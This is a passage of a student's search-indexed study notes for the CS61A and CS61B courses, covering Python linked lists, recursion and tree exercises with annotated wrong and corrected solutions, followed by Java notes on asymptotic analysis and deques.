has_cycle_constant(t)\n    False\n    \"\"\"\n    if link is Link.empty:\n        return False\n    slow, fast = link, link.rest\n    while fast is not Link.empty:\n        if fast.rest == Link.empty:\n            return False\n        elif fast is slow or fast.rest is slow:\n            return True\n        else:\n            slow, fast = slow.rest, fast.rest.rest\n    return False\n</code></pre></p>"},{"location":"cs61a%20notes/small_function.md/linked_list/","title":"Linked list","text":"<p>Decimal Expansion <pre><code>&gt;&gt;&gt; x = Link(0, Link(0, Link(4, Link(5))))\n&gt;&gt;&gt; x.rest.rest.rest.rest = x.rest.rest\n&gt;&gt;&gt; display(x, 20)\n0.04545454545454545454...\n</code></pre> not copied, but the same object!!! so it's a circle the same as the linked list in C</p> <pre><code>def divide(n, d):\n    \"\"\"Return a linked list with a cycle containing the digits of n/d.\n\n    &gt;&gt;&gt; display(divide(5, 6))\n    0.8333333333...\n    &gt;&gt;&gt; display(divide(2, 7))\n    0.2857142857...\n    &gt;&gt;&gt; display(divide(1, 2500))\n    0.0004000000...\n    &gt;&gt;&gt; display(divide(3, 11))\n    0.2727272727...\n    &gt;&gt;&gt; display(divide(3, 99))\n    0.0303030303...\n    \"\"\"\n    assert n &gt; 0 and n &lt; d\n    result = Link(0)  # The zero before the decimal point\n    cache = {}\n    tail = result\n    while n not in cache:\n        q, r = 10 * n // d, 10 * n % d\n        tail.rest = Link(q)\n        tail = tail.rest\n        cache[n] = tail\n        n = r\n    tail.rest = cache[n]\n    return result\n</code></pre> <pre><code>def store_digits(n):\n    \"\"\"Stores the digits of a positive number n in a linked list.\n\n    &gt;&gt;&gt; s = store_digits(1)\n    &gt;&gt;&gt; s\n    Link(1)\n    &gt;&gt;&gt; store_digits(2345)\n    Link(2, Link(3, Link(4, Link(5))))\n    &gt;&gt;&gt; store_digits(876)\n    Link(8, Link(7, Link(6)))\n    &gt;&gt;&gt; store_digits(2450)\n    Link(2, Link(4, Link(5, Link(0))))\n    &gt;&gt;&gt; store_digits(20105)\n    Link(2, Link(0, Link(1, Link(0, Link(5)))))\n    &gt;&gt;&gt; # a check for restricted functions\n    &gt;&gt;&gt; import inspect, re\n    &gt;&gt;&gt; cleaned = re.sub(r\"#.*\\\\n\", '', re.sub(r'\"{3}[\\s\\S]*?\"{3}', '', inspect.getsource(store_digits)))\n    &gt;&gt;&gt; print(\"Do not use str or reversed!\") if any([r in cleaned for r in [\"str\", \"reversed\"]]) else None\n    \"\"\"\n    \"*** YOUR CODE HERE ***\"\n    if n &lt; 10:\n        return Link(n)\n    all_but_last, last = n // 10, n % 10\n    link = store_digits(all_but_last)\n    while not link is Link.empty:\n        link = link.rest\n    link = Link(last)\n</code></pre> <p>However, the way you're updating <code>link</code> inside the loop (<code>link = link.rest</code>) doesn't actually modify the original linked list. Instead, you're just reassigning the local variable <code>link</code> to <code>None</code> when you reach the end of the list. After the loop, you try to set <code>link = Link(last)</code>, but at this point, <code>link</code> is no longer pointing to the original linked list\u2014it\u2019s just a local variable that was reassigned to <code>None</code>.</p> <p>still wrong: <pre><code>def store_digits(n):\n    if n &lt; 10:\n        return Link(n)\n    all_but_last, last = n // 10, n % 10\n    link = store_digits(all_but_last)       # return value \n    while not link.rest is Link.empty:\n        link = link.rest\n    link.rest = Link(last)      # manipulate\n</code></pre> didn't make clear the job of the function!</p> <p>3 parts: consistent! - base case -- actual action  - the next step -- actual action  - recursion call -- utilize the outcome</p> <p>return or manipulate???  Don't contradict!</p> <p>true: <pre><code>def store_digits(n):\n    if n &lt; 10:\n        return Link(n)\n    all_but_last, last = n // 10, n % 10\n    link = store_digits(all_but_last)\n    cur_link = link\n    while cur_link.rest is not Link.empty:\n        cur_link = cur_link.rest\n    cur_link.rest = Link(last)\n    return link\n</code></pre></p>"},{"location":"cs61a%20notes/small_function.md/predicate_function/","title":"Predicate function","text":"<p>predicate function: functions that will return True or False.</p> <p>Don't: <pre><code>def comp_equal(x):\n        if f(g(x)) == g(f(x)):\n            return True\n        else:\n            return False\n</code></pre> But: <pre><code>def comp_equal(x):\n        return f(g(x)) == g(f(x))\n</code></pre></p>"},{"location":"cs61a%20notes/small_function.md/recursive/","title":"Recursive","text":"<p>Define a function <code>cycle</code> that takes in three functions f1, f2, and f3, as arguments. cycle will return another function <code>g</code> that should take in an integer argument n and return another function <code>h</code>.   Here's what the final function h should do to x for a few values of n:</p> <ul> <li>n = 0, return x</li> <li>n = 1, apply f1 to x, or return f1(x)</li> <li>n = 2, apply f1 to x and then f2 to the result of that, or return f2(f1(x))</li> <li>n = 3, apply f1 to x, f2 to the result of applying f1, and then f3 to the result of applying f2, or f3(f2(f1(x)))</li> <li>n = 4, start the cycle again applying f1, then f2, then f3, then f1 again, or f1(f3(f2(f1(x))))</li> <li>And so forth. <pre><code>def cycle(f1, f2, f3):\n    def g(n):\n        def h(x):\n            if n == 0:\n                return x\n            return cycle(f2, f3, f1)(n - 1)(f1(x))\n        return h\n    return g\n</code></pre></li> </ul> <p><pre><code>def subseqs(s):\n    \"\"\"Return a nested list (a list of lists) of all subsequences of S.\n    The subsequences can appear in any order. You can assume S is a list.\n\n    &gt;&gt;&gt; seqs = subseqs([1, 2, 3])\n    &gt;&gt;&gt; sorted(seqs)\n    [[], [1], [1, 2], [1, 2, 3], [1, 3], [2], [2, 3], [3]]\n    &gt;&gt;&gt; subseqs([])\n    [[]]\n    \"\"\"\n    if s == []:\n        return [[]]\n    else:\n        rest = s[1:]\n        return subseqs(rest) + [[s[0]] + subs for subs in subseqs(rest)] \n</code></pre> wrong:</p> <p><pre><code>def subseqs(s):\n    if s == []:\n        return [[]]\n    else:\n        first = s[0]\n        del s[0]\n        return subseqs(s) + [[first] + subs for subs in subseqs(s)] \n</code></pre> the first call <code>subseqs(s)</code> will change s, causing error in the second call alert to side-effect in tree recursion!!! </p> <p>wrong: <pre><code>def subseqs(s):\n    if s == []:\n        return [[]]\n    else:\n        rest = s[1:]\n        return subseqs(rest) + [subs.append(s[0]) for subs in subseqs(rest)]\n</code></pre> - not satisfy the definition of subsequence - the return value of list.append() is None make clear the return value of built-in functions</p> <p><pre><code>def interleaved_sum(n, f_odd, f_even):\n    \"\"\"Compute the sum f_odd(1) + f_even(2) + f_odd(3) + ..., up\n    to n.\n\n    # ban loops and %\n    \"\"\"\n    def part_sum(k):\n        if k &gt; n:\n            res = 0\n        else:\n            res = f_odd(k)\n            if k + 1 &lt;= n:\n                res += f_even(k + 1) + part_sum(k + 2)\n        return res\n    return part_sum(1)\n</code></pre> - Since <code>%</code> is banned, we cannot compute whether n is odd or even, so consider calculate from left side  - To simplify, the iteration calls changes the value of parameter each time \u2192 help to decide the choice of parameter (what is changing?) - the parameter changes closer to the base case each time \u2192 help to decide the base case(change to what?) - if the chosen parameter (to compute) are not the same as the the the given parameter(to understand), just write an inner helper function and call it - each call not necessarily takes 1 step, it can take 2, 3...</p> <p><pre><code>def next_smaller_dollar(bill):\n    \"\"\"Returns the next smaller bill in order.\"\"\"\n    if bill == 100:\n        return 50\n    if bill == 50:\n        return 20\n    if bill == 20:\n        return 10\n    elif bill == 10:\n        return 5\n    elif bill == 5:\n        return 1\n\ndef count_dollars(total):\n    \"\"\"Return the number of ways to make change.\n\n    &gt;&gt;&gt; count_dollars(15)  # 15 $1 bills, 10 $1 &amp; 1 $5 bills, ... 1 $5 &amp; 1 $10 bills\n    6\n\n    # ban iteration\n    \"\"\"\n    def constrained_count(total, largest_bill):\n        if total == 0:\n            return 1\n        if total &lt; 0:\n            return 0\n        if largest_bill == None:\n            return 0\n        without_dollar_bill = constrained_count(total, next_smaller_dollar(largest_bill))\n        with_dollar_bill = constrained_count(total - largest_bill, largest_bill)\n        return without_dollar_bill + with_dollar_bill\n    return constrained_count(total, 100)\n</code></pre> think of <code>count_partitions</code></p> <p>possibilities / cases: a partition! - take m - not take m</p> <p>in <code>cats</code> <pre><code>def furry_fixes(typed, source, limit):\n    \"\"\"A diff function for autocorrect that determines how many letters\n    in TYPED need to be substituted to create SOURCE, then adds the difference in\n    their lengths to this value and returns the result.\n\n    Arguments:\n        typed: a starting word\n        source: a string representing a desired goal word\n        limit: a number representing an upper bound on the number of chars that must change\n\n    &gt;&gt;&gt; big_limit = 10\n    &gt;&gt;&gt; furry_fixes(\"nice\", \"rice\", big_limit)    # Substitute: n -&gt; r\n    1\n    &gt;&gt;&gt; furry_fixes(\"range\", \"rungs\", big_limit)  # Substitute: a -&gt; u, e -&gt; s\n    2\n    &gt;&gt;&gt; furry_fixes(\"pill\", \"pillage\", big_limit) # Don't substitute anything, length difference of 3.\n    3\n    &gt;&gt;&gt; furry_fixes(\"roses\", \"arose\", big_limit)  # Substitute: r -&gt; a, o -&gt; r, s -&gt; o, e -&gt; s, s -&gt; e\n    5\n    &gt;&gt;&gt; furry_fixes(\"rose\", \"hello\", big_limit)   # Substitute: r-&gt;h, o-&gt;e, s-&gt;l, e-&gt;l, length difference of 1.\n    5\n    \"\"\"\n    # BEGIN PROBLEM 6\n    fix_num = 0\n    def count(typed, source):\n        nonlocal fix_num\n        if fix_num &gt; limit:\n            return 100\n        elif len(typed) == 0:\n            fix_num += len(source)\n            return len(source)\n        elif len(source) == 0:\n            fix_num += len(typed)\n            return len(typed)\n        else:\n            fix_num += typed[0] != source[0]\n            return (typed[0] != source[0]) + count(typed[1:], source[1:])\n    count(typed, source)\n    return  fix_num\n</code></pre></p>"},{"location":"cs61a%20notes/small_function.md/recursive/#def_minimum_mewtationstyped_source_limit_a_diff_function_for_autocorrect_that_computes_the_edit_distance_from_typed_to_source_this_function_takes_in_a_string_typed_a_string_source_and_a_number_limit_arguments_typed_a_starting_word_source_a_string_representing_a_desired_goal_word_limit_a_number_representing_an_upper_bound_on_the_number_of_edits_big_limit_10_minimum_mewtationscats_scat_big_limit_cats_-_scats_-_scat_2_minimum_mewtationspurng_purring_big_limit_purng_-_purrng_-_purring_2_minimum_mewtationsckiteus_kittens_big_limit_ckiteus_-_kiteus_-_kitteus_-_kittens_3_if_limit_0_return_limit_1_if_lentyped_0_return_lensource_if_lensource_0_return_lentyped_if_typed0_source0_return_minimum_mewtationstyped1_source1_limit_else_add_1_minimum_mewtationstyped_source1_limit_-_1_remove_1_minimum_mewtationstyped1_source_limit_-_1_substitute_1_minimum_mewtationstyped1_source1_limit_-_1_return_minadd_remove_substitute","title":"<pre><code>def minimum_mewtations(typed, source, limit):\n    \"\"\"A diff function for autocorrect that computes the edit distance from TYPED to SOURCE.\n    This function takes in a string TYPED, a string SOURCE, and a number LIMIT.\n\n    Arguments:\n        typed: a starting word\n        source: a string representing a desired goal word\n        limit: a number representing an upper bound on the number of edits\n\n    &gt;&gt;&gt; big_limit = 10\n    &gt;&gt;&gt; minimum_mewtations(\"cats\", \"scat\", big_limit)       # cats -&gt; scats -&gt; scat\n    2\n    &gt;&gt;&gt; minimum_mewtations(\"purng\", \"purring\", big_limit)   # purng -&gt; purrng -&gt; purring\n    2\n    &gt;&gt;&gt; minimum_mewtations(\"ckiteus\", \"kittens\", big_limit) # ckiteus -&gt; kiteus -&gt; kitteus -&gt; kittens\n    3\n    \"\"\"\n    if limit &lt; 0:\n        return limit + 1\n    if len(typed) == 0:\n        return len(source) \n    if len(source) == 0:\n        return len(typed)\n    if typed[0] == source[0]: \n        return minimum_mewtations(typed[1:], source[1:], limit)\n    else:\n        add = 1 + minimum_mewtations(typed, source[1:], limit - 1)\n        remove = 1 + minimum_mewtations(typed[1:], source, limit - 1)\n        substitute = 1 + minimum_mewtations(typed[1:], source[1:], limit - 1)\n        return min(add, remove, substitute)\n</code></pre>","text":"<p><pre><code>def buy(fruits_to_buy, prices, total_amount):\n    \"\"\"Print ways to buy some of each fruit so that the sum of prices is amount.\n\n    &gt;&gt;&gt; prices = {'oranges': 4, 'apples': 3, 'bananas': 2, 'kiwis': 9}\n    &gt;&gt;&gt; buy(['apples', 'oranges', 'bananas'], prices, 16)\n    [2 apples][1 orange][3 bananas]\n    [2 apples][2 oranges][1 banana]\n    \"\"\"\n    def add(fruits, amount, cart):\n        if fruits == [] and amount == 0:\n            print(cart)\n        elif fruits and amount &gt; 0:\n            fruit = fruits[0]\n            price = prices[fruit]\n            for k in range(1, amount // price + 1):\n                # Hint: The display function will help you add fruit to the cart.\n                add(fruits[1:], amount - k * price, cart + display(fruit, k))\n    add(fruits_to_buy, total_amount, '')\n\n\ndef display(fruit, count):\n    \"\"\"Display a count of a fruit in square brackets.\n\n    &gt;&gt;&gt; display('apples', 3)\n    '[3 apples]'\n    &gt;&gt;&gt; print(display('apples', 3) + display('kiwis', 3))\n    [3 apples][3 kiwis]\n    \"\"\"\n    assert count &gt;= 1 and fruit[-1] == 's'\n    if count == 1:\n        fruit = fruit[:-1]  # get rid of the plural s\n    return '[' + str(count) + ' ' + fruit + ']'\n</code></pre> every <code>k</code> represents a choice you make for the next fruit</p> <p>every branch causes a seperate iteractive chain that not affect each other (you don't need to think about it)</p> <p>in <code>cats</code> project <pre><code>def minimum_mewtations(typed, source, limit):\n    \"\"\"A diff function for autocorrect that computes the edit distance from TYPED to SOURCE.\n    This function takes in a string TYPED, a string SOURCE, and a number LIMIT.\n\n    Arguments:\n        typed: a starting word\n        source: a string representing a desired goal word\n        limit: a number representing an upper bound on the number of edits\n\n    &gt;&gt;&gt; big_limit = 10\n    &gt;&gt;&gt; minimum_mewtations(\"cats\", \"scat\", big_limit)       # cats -&gt; scats -&gt; scat\n    2\n    &gt;&gt;&gt; minimum_mewtations(\"purng\", \"purring\", big_limit)   # purng -&gt; purrng -&gt; purring\n    2\n    &gt;&gt;&gt; minimum_mewtations(\"ckiteus\", \"kittens\", big_limit) # ckiteus -&gt; kiteus -&gt; kitteus -&gt; kittens\n    3\n    \"\"\"\n    if limit &lt; 0:\n        return limit + 1\n    if len(typed) == 0:\n        return len(source) \n    if len(source) == 0:\n        return len(typed)\n    if typed[0] == source[0]: \n        return minimum_mewtations(typed[1:], source[1:], limit)\n    else:\n        add = 1 + minimum_mewtations(typed, source[1:], limit - 1)\n        remove = 1 + minimum_mewtations(typed[1:], source, limit - 1)\n        substitute = 1 + minimum_mewtations(typed[1:], source[1:], limit - 1)\n        return min(add, remove, substitute)\n</code></pre> you can change <code>limit</code>!!!  think of all the parameters to change </p>"},{"location":"cs61a%20notes/small_function.md/recursive/#tail_recursion","title":"Tail Recursion","text":"<p>use extra parameter to keep track of progress so far</p> <p>num splits <pre><code>def num_splits(s, d):\n    \"\"\"Return the number of ways in which s can be partitioned into two\n    sublists that have sums within d of each other.\n\n    &gt;&gt;&gt; num_splits([1, 5, 4], 0)  # splits to [1, 4] and [5]\n    1\n    &gt;&gt;&gt; num_splits([6, 1, 3], 1)  # no split possible\n    0\n    &gt;&gt;&gt; num_splits([-2, 1, 3], 2) # [-2, 3], [1] and [-2, 1, 3], []\n    2\n    &gt;&gt;&gt; num_splits([1, 4, 6, 8, 2, 9, 5], 3)\n    12\n    \"\"\"\n    def helper(s, left, right):\n        if s == []:\n            if 0 &lt; right - left &lt;= d:\n                return 1\n            elif right - left == 0:\n                return 0.5\n            else:\n                return 0\n        return helper(s[1:], left + s[0], right) + helper(s[1:], left, right + s[0])\n    return int(helper(s, 0, 0))\n</code></pre></p> <p><pre><code>def num_splits(s, d):\n    def difference_so_far(s, difference):\n        if not s:\n            if abs(difference) &lt;= d:\n                return 1\n            else:\n                return 0\n        element = s[0]\n        s = s[1:]\n        return difference_so_far(s, difference + element) + difference_so_far(s, difference - element)\n    return difference_so_far(s, 0)//2\n</code></pre> \u5bf9\u4e8e\u6240\u6709\u7684\u51fd\u6570\u4e00\u5b9a\u8981\u5148\u601d\u8003\u5b83\u7684 job \u5230\u5e95\u662f\u4ec0\u4e48\uff01\uff01\uff01</p> <p><code>num_splits(s, d)</code> \u672c\u8eab\u662f\u4f20\u4e00\u4e2a\u5217\u8868\u548c\u5dee\u503c\uff0c \u8fd4\u56de 0 &lt;= \u53f3 - \u5de6 &lt;= d \u7684 partion \u4e2a\u6570 \u601d\u8003\uff0c\u5904\u7406\u5b8cs \u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u4e4b\u540e\u5bf9\u4e8es[1:]\u7684\u5904\u7406\u65b9\u6cd5\u662f\u4e00\u6837\u7684\u5417\uff1f \u4e0d\u662f\uff01not the same type of questions!!! \u5982\u679c s[0] \u662f\u6b63\u6570\uff0c\u653e\u5230\u53f3\u8fb9\uff0c\u5f88\u53ef\u80fd\u5bf9\u4e8e s[1:] \u7684\u5206\u5272\u5e76\u4e0d\u662f\u53f3\u8fb9 &gt;= \u5de6\u8fb9\u4e86 so, \u5fc5\u987b\u8981\u6709\u4e00\u4e2a\u8ddf\u8e2a\u5168\u5c40\u7684\u53c2\u6570!!!</p>"},{"location":"cs61a%20notes/small_function.md/tree/","title":"Tree","text":"<p><pre><code>def prune_leaves(t, vals):\n    \"\"\"Return a modified copy of t with all leaves that have a label\n    that appears in vals removed.  Return None if the entire tree is\n    pruned away.\n\n    &gt;&gt;&gt; t = tree(2)\n    &gt;&gt;&gt; print(prune_leaves(t, (1, 2)))\n    None\n    &gt;&gt;&gt; numbers = tree(1, [tree(2), tree(3, [tree(4), tree(5)]), tree(6, [tree(7)])])\n    &gt;&gt;&gt; print_tree(numbers)\n    1\n      2\n      3\n        4\n        5\n      6\n        7\n    &gt;&gt;&gt; print_tree(prune_leaves(numbers, (3, 4, 6, 7)))\n    1\n      2\n      3\n        5\n      6\n    \"\"\"\n    if is_leaf(t) and (label(t) in vals):\n        return None\n        new_branches = []   # if you cannot change , save!\n        for b in branches(t):\n        new_branch = prune_leaves(b, vals)\n        if new_branch:\n            new_branches += [new_branch]    # or use append()\n        return tree(label(t), new_branches)\n</code></pre> Apart from to the base case, also think from the base case</p> <p>the job of the function is to return a new tree rather than manipulate it! </p> <p>wrong: <pre><code>def prune_leaves(t, vals):\n    if t == []:\n        return None\n    elif is_leaf(t):\n        if t[0] in vals:\n            return None\n        else:\n            return t\n    else:\n        for subt in t[1:]:\n            subt = prune_leaves(subt, vals) # useless! \n    return t\n</code></pre> <pre><code>a = [1, 2, 3]\nx = a[0]    # int type, immutable!\nx = 100     # a is never changed\n</code></pre></p> <p>wrong: <pre><code>if is_leaf(t) and (label(t) in vals):\n      return None\n    new_branches = []\n    for b in branches(t):\n      new_branch = prune_leaves(b, vals)\n      if new_branch:\n        new_branches += new_branch\n    return tree(label(t), new_branches)\n</code></pre> differenciate <code>+</code> and <code>append()</code> !!!</p> <p><pre><code>def yield_paths(t, value):\n    \"\"\"\n    Yields all possible paths from the root of t to a node with the label\n    value as a list.\n\n    &gt;&gt;&gt; t1 = tree(1, [tree(2, [tree(3), tree(4, [tree(6)]), tree(5)]), tree(5)])\n    &gt;&gt;&gt; print_tree(t1)\n    1\n      2\n        3\n        4\n          6\n        5\n      5\n    &gt;&gt;&gt; next(yield_paths(t1, 6))\n    [1, 2, 4, 6]\n    &gt;&gt;&gt; path_to_5 = yield_paths(t1, 5)\n    &gt;&gt;&gt; sorted(list(path_to_5))\n    [[1, 2, 5], [1, 5]]\n\n    &gt;&gt;&gt; t2 = tree(0, [tree(2, [t1])])\n    &gt;&gt;&gt; print_tree(t2)\n    0\n      2\n        1\n          2\n            3\n            4\n              6\n            5\n          5\n    &gt;&gt;&gt; path_to_2 = yield_paths(t2, 2)\n    &gt;&gt;&gt; sorted(list(path_to_2))\n    [[0, 2], [0, 2, 1, 2]]\n    \"\"\"\n    if label(t) == value:\n        yield [label(t)]\n    for b in branches(t):\n        for path in yield_paths(b, value):\n            yield [label(t)] + path\n</code></pre> not find: return <code>None</code> (implicitly!)</p> <p><pre><code>def delete(t, x):\n    \"\"\"Remove all nodes labeled x below the root within Tree t. When a non-leaf\n    node is deleted, the deleted node's children become children of its parent.\n\n    The root node will never be removed.\n\n    &gt;&gt;&gt; t = Tree(3, [Tree(2, [Tree(2), Tree(2)]), Tree(2), Tree(2, [Tree(2, [Tree(2), Tree(2)])])])\n    &gt;&gt;&gt; delete(t, 2)\n    &gt;&gt;&gt; t\n    Tree(3)\n    &gt;&gt;&gt; t = Tree(1, [Tree(2, [Tree(4, [Tree(2)]), Tree(5)]), Tree(3, [Tree(6), Tree(2)]), Tree(4)])\n    &gt;&gt;&gt; delete(t, 2)\n    &gt;&gt;&gt; t\n    Tree(1, [Tree(4), Tree(5), Tree(3, [Tree(6)]), Tree(4)])\n    &gt;&gt;&gt; t = Tree(1, [Tree(2, [Tree(4), Tree(5)]), Tree(3, [Tree(6), Tree(2)]), Tree(2, [Tree(6),  Tree(2), Tree(7), Tree(8)]), Tree(4)])\n    &gt;&gt;&gt; delete(t, 2)\n    &gt;&gt;&gt; t\n    Tree(1, [Tree(4), Tree(5), Tree(3, [Tree(6)]), Tree(6), Tree(7), Tree(8), Tree(4)])\n    \"\"\"\n    new_branches = []\n    for b in t.branches:\n        delete(b, x)\n        if b.label == x:\n            new_branches += b.branches\n        else:\n            new_branches.append(b)\n    t.branches = new_branches\n</code></pre> recursive faith! just make clear the relationship of input and output / the job of the function - return a new tree? - manipulate the original tree? (no need to return) </p> <p><code>delete</code> each branch, then manipulate their roots rather than cope with their roots first</p> <ul> <li>take 1 step -&gt; call recursion</li> <li>call recursion -&gt; take 1 step</li> </ul> <pre><code>for b in t.branches:\n  if b.label == x:\n    new_branches += [delete(sub_branch) for sub_branch in b.branches]   \n    # if the sub_branch.lebel == x, it can't be deleted\n  else:\n    new_branch.append(delete(b, x))\n</code></pre> <pre><code>def long_paths(tree, n):\n    \"\"\"Return a list of all paths in tree with length at least n.\n\n    &gt;&gt;&gt; t = Tree(3, [Tree(4), Tree(4), Tree(5)])\n    &gt;&gt;&gt; left = Tree(1, [Tree(2), t])\n    &gt;&gt;&gt; mid = Tree(6, [Tree(7, [Tree(8)]), Tree(9)])\n    &gt;&gt;&gt; right = Tree(11, [Tree(12, [Tree(13, [Tree(14)])])])\n    &gt;&gt;&gt; whole = Tree(0, [left, Tree(13), mid, right])\n    &gt;&gt;&gt; for path in long_paths(whole, 2):\n    ...     print(path)\n    ...\n    &lt;0 1 2&gt;\n    &lt;0 1 3 4&gt;\n    &lt;0 1 3 4&gt;\n    &lt;0 1 3 5&gt;\n    &lt;0 6 7 8&gt;\n    &lt;0 6 9&gt;\n    &lt;0 11 12 13 14&gt;\n    &gt;&gt;&gt; for path in long_paths(whole, 3):\n    ...     print(path)\n    ...\n    &lt;0 1 3 4&gt;\n    &lt;0 1 3 4&gt;\n    &lt;0 1 3 5&gt;\n    &lt;0 6 7 8&gt;\n    &lt;0 11 12 13 14&gt;\n    &gt;&gt;&gt; long_paths(whole, 4)\n    [Link(0, Link(11, Link(12, Link(13, Link(14)))))]\n    \"\"\"\n    paths = []\n    if n &lt;= 0 and tree.is_leaf():\n        paths.append(Link(tree.label))\n    for b in tree.branches:\n        for path in long_paths(b, n - 1):\n            paths.append(Link(tree.label, path))\n    return paths\n</code></pre> <p>wrong: <pre><code>def long_paths(tree, n):\n    paths = []\n    if tree.is_leaf():\n        if n &lt;= 1:\n            return [Link(tree.label)]\n        else:\n            return []\n    for b in tree.branches:\n        b_paths = long_paths(b, n - 1)\n        for path in b_paths:\n             rest = path\n             path.first = tree.label\n             path.rest = rest\n        paths += b_paths\n    return paths\n</code></pre> - you are changing the object which may be used in other path, other than create a new one alert to side effect in tree recursion!!!</p> <ul> <li>the base case:   there are 2 parameters changing / decreasing: the tree and n   but just focus on one</li> </ul> <p>in-order traversal <pre><code>def in_order_traversal(t):\n    def in_order(lst, t):\n      if t,is_leaf():\n        return [t.label]\n      lst += in_order_traversal(t.branches[0])\n      lst.append(t.label)\n      for b in t.branches[1:]:\n        lst += in_order_traversal(b)\n      return lst\n    return in_order([], t)    # don't forget! the job is to return, not manupulate!\n</code></pre> function abstraction!!! make clear the job of function, then you can: use it before implement it!!!</p> <p>better: <pre><code>def in_order_traversal(t):\n    if t.is_leaf():\n        yield t.label\n    else:\n        left, right = t.branches  # get lst[0] and lst[1:]\n        yield from in_order_traversal(left)\n        yield t.label\n        yield from in_order_traversal(right)\n</code></pre> use iterator (lazily) rather than list (save all) may simplify some questions</p>"},{"location":"cs61a%20notes/small_function.md/unique_digits/","title":"Unique digits","text":"<p><pre><code>def unique_digits(n):\n    \"\"\"Return the number of unique digits in positive integer n.\n\n    &gt;&gt;&gt; unique_digits(8675309) # All are unique\n    7\n    &gt;&gt;&gt; unique_digits(13173131) # 1, 3, and 7\n    3\n    &gt;&gt;&gt; unique_digits(101) # 0 and 1\n    2\n    \"\"\"\n    \"*** YOUR CODE HERE ***\"\n</code></pre> \u4e24\u79cd\u601d\u8def - \u4ece\u7ed9\u51fa\u7684 n \u51fa\u53d1\uff0c\u6bcf\u6b21\u5224\u65ad\u4e00\u4f4d\u662f\u5426\u51fa\u73b0\u8fc7\uff08\u8fd9\u4e5f\u662f\u4eba\u773c\u8bc6\u522b\u7684\u903b\u8f91\uff09</p> <ul> <li>\u5148\u4e0d\u7ba1\u53c2\u6570\u662f\u4ec0\u4e48\uff0c \u4ece\u6240\u6709\u7684\u53ef\u80fd\u6027\u51fa\u53d1(bucket)   \u6761\u4ef6\uff1a\u53ef\u80fd\u6027\u5c11\uff08\u603b\u5171\u53ea\u6709 9 \u79cd digits\uff09</li> </ul> <p>```py     def has_digit(n, k):         \"\"\"Returns whether k is a digit in n.</p> <pre><code>    &gt;&gt;&gt; has_digit(10, 1)\n    True\n    &gt;&gt;&gt; has_digit(12, 7)\n    False\n    \"\"\"\n    assert k &gt;= 0 and k &lt; 10\n    \"*** YOUR CODE HERE ***\"\n```\n</code></pre>"},{"location":"cs61b%20notes/Asymptotic/","title":"Asymptotic","text":""},{"location":"cs61b%20notes/Asymptotic/#asymptotics","title":"Asymptotics","text":""},{"location":"cs61b%20notes/Asymptotic/#an_introduction_to_asymptotic_analysis","title":"An Introduction to Asymptotic Analysis","text":"<p>We can consider the process of writing efficient programs from two different perspectives:</p> <ul> <li>Programming Cost</li> <li>develop</li> <li>read or modify</li> <li>maintain</li> <li>Execution Cost </li> <li>Time complexity</li> <li>Space complexity</li> </ul>"},{"location":"cs61b%20notes/Asymptotic/#runtime_characterization","title":"Runtime Characterization","text":"<ul> <li>measure execution time in seconds </li> <li>Use Unix's built in time command.</li> <li> <p>Use the Princeton Standard library which has a <code>stopwatch</code> class.</p> </li> <li> <p>count the total number of operations</p> </li> <li> <p>symbolic count</p> </li> </ul>"},{"location":"cs61b%20notes/Asymptotic/#asymptotic_behavior","title":"Asymptotic Behavior","text":"<ul> <li>Only consider the worst case.</li> <li>Pick a representative operation (aka: cost model)</li> <li>Ignore lower order terms</li> <li>Ignore multiplicative constants.</li> </ul>"},{"location":"cs61b%20notes/Asymptotic/#order_of_growth","title":"Order of Growth","text":"<ul> <li>Big Theta (\u0398)</li> <li>Big O (\u039f)</li> <li>Big Omega (\u03a9)</li> </ul>"},{"location":"cs61b%20notes/Asymptotic/#nested_for_loops","title":"Nested For Loops","text":"<pre><code>public static void printParty(int N) {\n   for (int i = 1; i &lt;= N; i = i * 2) {\n      for (int j = 0; j &lt; i; j += 1) {\n         System.out.println(\"hello\");   \n         int ZUG = 1 + 1;\n      }\n   }\n}\n</code></pre>"},{"location":"cs61b%20notes/Asymptotic/#finding_the_bound_visually","title":"Finding the Bound Visually","text":"<p> graph the trajectory of 0.5 N, 4N and \\(C(N)\\) itself </p> <p>Geometric Visualization: </p>"},{"location":"cs61b%20notes/Asymptotic/#finding_the_bound_mathematically","title":"Finding the Bound Mathematically","text":"<p>We can obtain the same result by solving our equation from above with the power of mathematics:</p> \\[ C(N) = 1 + 2 + 4 + ... + N = 2N - 1=\u0398(N) \\]"},{"location":"cs61b%20notes/Asymptotic/#amortized_analysis","title":"Amortized Analysis","text":"<p>Any single operation may take longer, but if we use it over many operations, we're guaranteed to have a better average performance</p> <p><pre><code>public void addLast(int x) {\n   if (size == items.length) {\n       resize(size + RFACTOR);\n   }\n   items[size] = x;\n   size += 1;\n}\n</code></pre> After N addLasts, runtime is \\(\u0398(N^2)\\) \u2192 \\(\u0398(N)\\) amortized</p> <p><pre><code>public void addLast(int x) {\n   if (size == items.length) {\n       resize(size * RFACTOR);\n   }\n   items[size] = x;\n   size += 1;\n}\n</code></pre> After N addLasts, runtime is \\(\u0398(N)\\) \u2192 \\(\u0398(1)\\) amortized</p>"},{"location":"cs61b%20notes/Asymptotic/#recursive_analysis","title":"Recursive Analysis","text":"<p><pre><code>public static int fib(int n) {\n   if (n &lt;= 1) \nreturn 1;\n   return fib(n-1) + fib(n-2);\n}\n</code></pre> $$    \\begin{align}    C(N) = C(N - 1) + C(N - 2)\\    C(0) = 0\\    C(1) = 0    \\end{align} $$</p>"},{"location":"cs61b%20notes/Asymptotic/#binary_search","title":"Binary Search","text":"<p>depends on the times of calling functions</p>"},{"location":"cs61b%20notes/Asymptotic/#mergesort","title":"MergeSort","text":"<p>\\(C(N) = 2*C(N/2) + N\\)</p>"},{"location":"cs61b%20notes/Asymptotic/#summary","title":"Summary","text":"<p>There are no magic shortcuts for analyzing code runtime.</p>"},{"location":"cs61b%20notes/Deque/","title":"Deque","text":""},{"location":"cs61b%20notes/Deque/#deque","title":"Deque","text":"<p>A linear collection that supports element insertion and removal at both ends. The name deque is short for \u201cdouble ended queue\u201d and is usually pronounced \u201cdeck\u201d. Most Deque implementations place no fixed limits on the number of elements they may contain, but this interface supports capacity-restricted deques as well as those with no fixed size limit.</p> <p>Generic Type <pre><code>public class LinkedListDeque61B&lt;T&gt; implements Deque61B&lt;T&gt; {\n    Node sentinel;\n\n    private class Node{     // not generic\n        T item;     // non-static inner class can use the general type from the closing class\n        Node next;\n        Node prev;\n\n        Node(){\n            next = this;\n            prev = this;\n        }\n\n        Node(T item){\n            this.item = item;\n            next = 